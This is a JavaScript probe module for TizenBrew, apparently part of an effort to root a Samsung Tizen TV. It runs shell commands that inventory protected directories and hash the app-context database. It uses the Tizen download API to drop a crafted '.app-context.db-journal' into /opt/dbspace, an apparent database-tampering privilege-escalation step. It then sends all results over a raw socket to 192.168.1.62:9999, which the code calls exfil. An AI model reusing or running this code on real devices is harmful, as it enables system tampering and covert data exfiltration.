"use strict";

/* p10: TizenBrew module
   - tizen surface map (service context): download API present?
   - state: journal stat (rmfile check), live md5, /opt/dbspace ls, sdk_tools ls,
     swap markers /tmp/swap_done.txt + /tmp/swap_err.txt, /tmp ls,
     /home/owner/.tizen ls + dotnet-apps.txt
   - download tests: control (serve_test.txt) + journal delivery,
     full onfailed error capture (code/name/message)
   - exfil to Mac 192.168.1.62:9999
*/

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p10', results: {}, log: [] };

function L(s) { R.log.push(String(s).substring(0, 500)); }
function run(cmd, timeout) {
  try {
    return cp.execSync(cmd, { timeout: timeout || 20000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
  } catch (e) {
    var out = '';
    if (e.stdout) out += e.stdout.toString();
    if (e.stderr) out += (out ? '\n' : '') + e.stderr.toString();
    return '[err] ' + (out || (e && e.message) || 'unknown');
  }
}

function postRaw(path, text) {
  var buf = new Buffer(text, 'utf8');
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: text/plain\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  var sock = null;
  try { sock = net.connect(PORT, HOST); } catch (e) { L('post ctor ' + e); return; }
  sock.on('connect', function () {
    try { sock.write(hdr); } catch (e) { L('hdr ' + e); }
    var off = 0;
    var iv = setInterval(function () {
      if (off >= buf.length) {
        clearInterval(iv);
        setTimeout(function () { try { sock.destroy(); } catch (e) {} }, 3000);
        return;
      }
      try { sock.write(buf.slice(off, off + 4096)); } catch (e) {}
      off += 4096;
    }, 100);
    setTimeout(function () { try { sock.destroy(); } catch (e) {} }, 90000);
  });
  sock.on('error', function (e) { L('post error ' + e.message); });
}

function main() {
  var tz = (typeof tizen !== 'undefined') ? tizen : null;
  R.results.tizen = tz ? 'present' : 'absent';
  if (tz) {
    try { R.results.tizen_keys = Object.getOwnPropertyNames(tz).join(',').substring(0, 2000); }
    catch (e) { L('tizen keys err ' + e); }
    R.results.dl_api = {
      download: (function () { try { return typeof tz.download; } catch (e) { return 'ex:' + e; } })(),
      dl_start: (function () { try { return typeof (tz.download && tz.download.start); } catch (e) { return 'ex:' + e; } })(),
      DownloadRequest: (function () { try { return typeof tz.DownloadRequest; } catch (e) { return 'ex:' + e; } })(),
      getState: (function () { try { return typeof (tz.download && tz.download.getState); } catch (e) { return 'ex:' + e; } })()
    };
  }

  R.results.jrn_stat = run('stat /opt/dbspace/.app-context.db-journal 2>&1', 10000);
  R.results.live_md5 = run('md5sum /opt/dbspace/.app-context.db 2>&1', 15000);
  R.results.dbspace_ls = run('ls -la /opt/dbspace/ 2>&1 | head -40', 15000);
  R.results.sdktools_ls = run('ls -la /home/owner/share/tmp/sdk_tools/ 2>&1 | head -40', 15000);
  R.results.swap_done = run('cat /tmp/swap_done.txt 2>&1', 10000);
  R.results.swap_err = run('cat /tmp/swap_err.txt 2>&1', 10000);
  R.results.tmp_ls = run('ls -la /tmp/ 2>&1 | head -50', 15000);
  R.results.tizen_dir = run('ls -la /home/owner/.tizen/ 2>&1 | head -30', 15000);
  R.results.dotnet_apps_home = run('cat /home/owner/.tizen/dotnet-apps.txt 2>&1 | head -20', 10000);
  R.results.dotnet_apps_usr = run('cat /usr/bin/dotnet-apps.txt 2>&1 | head -20', 10000);

  if (tz && tz.download && tz.download.start && tz.DownloadRequest) {
    var events = [];
    function descArgs(args) {
      var out = [];
      for (var i = 0; i < args.length; i++) {
        var a = args[i], s = 'arg' + i + ':';
        try {
          if (a === null) s += 'null';
          else if (a === undefined) s += 'undefined';
          else if (typeof a === 'object') {
            s += Object.prototype.toString.call(a);
            try { s += ' ' + JSON.stringify(a); } catch (e2) {}
            try {
              var props = Object.getOwnPropertyNames(a), pd = [];
              for (var j = 0; j < props.length; j++) {
                try { pd.push(props[j] + '=' + String(a[props[j]]).substring(0, 250)); } catch (e3) { pd.push(props[j] + '=<err>'); }
              }
              if (pd.length) s += ' {' + pd.join(' | ') + '}';
            } catch (e4) {}
          } else s += ' ' + String(a).substring(0, 300);
        } catch (e5) { s += ' <unstr>'; }
        out.push(s);
      }
      return out.join(' ;; ');
    }
    function dlTest(url, dest, fileName, label, done) {
      var req = null, id = null, finished = false;
      var st = {};
      st.state = 'pending'; st.fullPath = null; st.args = '';
      function mark(res, extra) {
        if (finished) return;
        finished = true;
        st.state = res;
        if (extra) for (var k in extra) st[k] = extra[k];
        R.results['dl_' + label] = st;
        done();
      }
      try {
        var opts = {
          downloadCallback: {
            onprogress: function () { events.push(label + ':progress'); },
            oncompleted: function () {
              var d = descArgs(arguments);
              events.push(label + ':completed ' + d);
              st.args = d;
              try { st.fullPath = String(req.fullPath); } catch (e) {}
              mark('COMPLETED');
            },
            onfailed: function () {
              var d = descArgs(arguments);
              events.push(label + ':failed ' + d);
              st.args = d;
              try { st.fullPath = String(req.fullPath); } catch (e) {}
              mark('FAILED');
            }
          }
        };
        if (dest) opts.dest = dest;
        if (fileName) opts.fileName = fileName;
        req = new tz.DownloadRequest(url, opts);
        id = tz.download.start(req);
        st.state = 'started id=' + id;
        var t0 = Date.now();
        var iv = setInterval(function () {
          if (finished) { clearInterval(iv); return; }
          try {
            var s2 = String(tz.download.getState(id));
            if (s2.indexOf('COMPLETED') >= 0 || s2.indexOf('FAILED') >= 0 || s2.indexOf('ABORT') >= 0) {
              st.state = s2;
              try { st.fullPath = String(req.fullPath); } catch (e) {}
              if (!finished) { clearInterval(iv); setTimeout(function () { mark(s2); }, 2000); }
              return;
            }
            st.state = s2;
          } catch (e) {}
          if (Date.now() - t0 > 90000) {
            clearInterval(iv);
            if (!finished) mark(st.state + ' (timeout)');
          }
        }, 1000);
      } catch (e) {
        mark('EXC ' + e, { stack: (e && e.stack) || '' });
      }
    }
    L('p10: running download tests');
    dlTest('http://192.168.1.62:9999/serve_test.txt', '/opt/dbspace', 'p10a.txt', 'D_ctl', function () {
      L('p10: D_ctl done -> ' + R.results.dl_D_ctl.state);
      dlTest('http://192.168.1.62:9999/appctx_hot_journal', '/opt/dbspace', '.app-context.db-journal', 'J_jrn', function () {
        L('p10: J_jrn done -> ' + R.results.dl_J_jrn.state);
        R.results.events = events;
        R.results.final = 'done ' + new Date().toISOString();
        postRaw('/p10info', JSON.stringify(R));
        L('p10: exfil posted');
      });
    });
  } else {
    R.results.events = [];
    R.results.final = 'no download API in service context: ' + JSON.stringify(R.results.dl_api || {});
    postRaw('/p10info', JSON.stringify(R));
    L('p10: exfil posted (no dl api)');
  }
}

main();
